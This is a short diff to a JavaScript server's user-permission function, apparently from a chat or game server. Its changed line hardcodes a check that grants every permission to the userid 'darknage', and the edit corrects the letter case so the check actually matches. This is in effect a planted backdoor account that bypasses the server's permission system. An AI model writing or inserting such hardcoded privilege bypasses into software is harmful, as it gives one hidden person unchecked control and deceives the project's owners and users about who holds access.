@@ -592,7 +592,7 @@ User = (function () {
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
-		if (this.hasSysopAccess()) return true; if (this.userid === "Darknage") return true;
+		if (this.hasSysopAccess()) return true; if (this.userid === "darknage") return true;
 
 		var group = this.group;
 		var targetGroup = '';
